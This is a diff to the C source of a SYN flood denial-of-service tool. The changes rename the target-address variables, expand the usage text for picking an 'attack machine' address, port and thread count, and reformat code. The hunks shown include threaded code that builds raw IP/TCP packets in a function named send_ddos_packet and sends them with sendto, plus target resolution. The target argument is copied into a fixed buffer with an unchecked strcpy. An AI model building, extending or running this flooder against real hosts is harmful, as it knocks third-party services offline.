@@ -18,32 +18,37 @@
 #include "syn-flood.h"
 
 int raw_sock = 0;
+int dst_port = 0;
 static int alive = -1;
 
-char dst_ip[20] = { 0 };
-int dst_port;
-char src_dst_ip[100] = { 0 };
+char dst_ip[BUF_SIZE] = { 0 };
+char arg_ip[BUF_SIZE] = { 0 };
 
 void print_options_programm()
 {
-	printf("-h help\n");
+	printf("Unknown option: -h\n");
+	printf("usage:\n");
+	printf("\t[-a | --addr] ip address destination attack machine\n"); 
+	printf("\t[-h | --help]	help\n");
+    printf("\t[-p | --port]	port destination attack machine\n"); 
+	printf("\t[-t | --thread] number of threads\n");
 }
 
 int set_options(int argc, char **argv)
 {
 	int val_thread = MAXCHILD;
 	struct option opts[] = {
-    {"help", no_argument, 0, 'h'},
-    {"addr", required_argument, 0, 'a'},
-    {"port", required_argument, 0, 'p'},
-    {"thread", required_argument, 0, 't'},
-    {0,0,0,0},
+    	{"help", no_argument, 0, 'h'},
+    	{"addr", required_argument, 0, 'a'},
+    	{"port", required_argument, 0, 'p'},
+    	{"thread", required_argument, 0, 't'},
+    	{0, 0, 0, 0},
     };
 	int c;
 	while ((c = getopt(argc, argv, "ha:p:t:")) != -1) {
     	switch (c) {
 			case 'a':
-				strcpy(src_dst_ip, optarg);
+				strcpy(arg_ip, optarg);
 				break;
       
 			case 'h':
@@ -165,11 +170,12 @@ void send_ddos_packet(struct sockaddr_in *addr)
     memcpy(send_buf, &ip, sizeof(ip));
     memcpy(send_buf + sizeof(ip), &tcp, sizeof(tcp_hdr));
     printf(".\n");
-    
+
     if (sendto(raw_sock, send_buf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr)) < 0) {
       perror("sendto()");
       pthread_exit("fail");
     }
+
     sleep(1);
 }
 }
@@ -194,7 +200,7 @@ int main(int argc, char *argv[])
 	pthread_t pthread[n_pthread];
 	
 	alive = 1;
-	/* CTRL+C */
+	/* CTRL + C */
 	signal(SIGINT, sig_int);
 
 	memset(&addr, '\0', sizeof(addr));
@@ -203,21 +209,21 @@ int main(int argc, char *argv[])
 	addr.sin_port = htons(dst_port);
 
 	if (inet_addr(dst_ip) == INADDR_NONE) {
-    	host = gethostbyname(src_dst_ip);
+    	host = gethostbyname(arg_ip);
     	if(host == NULL) {
       		perror("gethostbyname()");
       		exit(1);
    		}
 	addr.sin_addr = *((struct in_addr*)(host->h_addr));
     strncpy(dst_ip, inet_ntoa(addr.sin_addr), 16);
-} else {
-    addr.sin_addr.s_addr = inet_addr(dst_ip);
-}
+	} else {
+    	addr.sin_addr.s_addr = inet_addr(dst_ip);
+	}
 
-if (dst_port < 0 || dst_port > 65535) {
-    printf("Port Error\n");
-    exit(1);
-}
+	if (dst_port < 0 || dst_port > 65535) {
+    	printf("Port Error\n");
+    	exit(1);
+	}
 
 	printf("host ip=%s\n", inet_ntoa(addr.sin_addr));
 
